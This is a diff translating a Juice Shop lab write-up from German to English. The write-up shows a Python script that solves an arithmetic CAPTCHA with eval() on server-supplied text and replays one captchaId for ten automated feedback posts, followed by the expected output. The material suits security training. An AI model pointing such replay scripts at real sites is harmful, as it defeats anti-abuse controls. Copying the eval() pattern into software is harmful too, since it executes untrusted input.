@@ -114,38 +114,38 @@ The following Python script automates the bypass by:
 ```python
 import requests
 
-# Konfiguration
+# Configuration
 BASE_URL = "http://localhost:4000"
-ANZAHL_REQUESTS = 10
+COUNT_REQUESTS = 10
 
-# Schritt 1: CAPTCHA vom Server abrufen
+# Step 1: Get CAPTCHA from server
 captcha_response = requests.get(f"{BASE_URL}/rest/captcha/")
 captcha_data = captcha_response.json()
 
 captcha_id = captcha_data["captchaId"]
-captcha_ausdruck = captcha_data["captcha"]
+captcha_expression = captcha_data["captcha"]
 
-# Schritt 2: CAPTCHA lösen (arithmetischer Ausdruck)
-captcha_antwort = str(eval(captcha_ausdruck))
+# Step 2: Solve CAPTCHA
+captcha_response = str(eval(captcha_expression))
 
-print(f"CAPTCHA ID:      {captcha_id}")
-print(f"CAPTCHA Frage:   {captcha_ausdruck}")
-print(f"CAPTCHA Antwort: {captcha_antwort}")
-print(f"Sende {ANZAHL_REQUESTS} Feedback-Anfragen...\n")
+print(f"CAPTCHA ID:       {captcha_id}")
+print(f"CAPTCHA Question: {captcha_expression}")
+print(f"CAPTCHA Answer:   {captcha_response}")
+print(f"Send {COUNT_REQUESTS} Requests...\n")
 
-# Schritt 3: Feedback 10x mit derselben captchaId senden
-for i in range(ANZAHL_REQUESTS):
+# Step 3: Send same captchaId 10x
+for i in range(COUNT_REQUESTS):
     payload = {
         "captchaId": captcha_id,
-        "captcha": captcha_antwort,
-        "comment": f"Automatisierter Test-Feedback #{i + 1}",
+        "captcha": captcha_response,
+        "comment": f"Automated Feedback Test #{i + 1}",
         "rating": 5
     }
 
     response = requests.post(f"{BASE_URL}/api/Feedbacks/", json=payload)
     print(f"Request {i + 1:>2}: HTTP {response.status_code}")
 
-print("\nFertig — Challenge sollte im Scoreboard als gelöst markiert sein.")
+print("\nDone. Please check score board.")
 ```
 
 **Step 4 – Run the script**
@@ -157,9 +157,9 @@ python captcha_bypass.py
 Expected output:
 ```
 CAPTCHA ID:      5
-CAPTCHA Frage:   10 + 9
-CAPTCHA Antwort: 19
-Sende 10 Feedback-Anfragen...
+CAPTCHA Question:   10 + 9
+CAPTCHA Answer: 19
+Send 10 Requests...
 
 Request  1: HTTP 201
 Request  2: HTTP 201
@@ -172,7 +172,7 @@ Request  8: HTTP 201
 Request  9: HTTP 201
 Request 10: HTTP 201
 
-Fertig — Challenge sollte im Scoreboard als gelöst markiert sein.
+Done. Please check score board.
 ```
 
 All 10 requests succeed within well under 20 seconds. The Juice Shop awards the **"CAPTCHA Bypass"** challenge immediately.
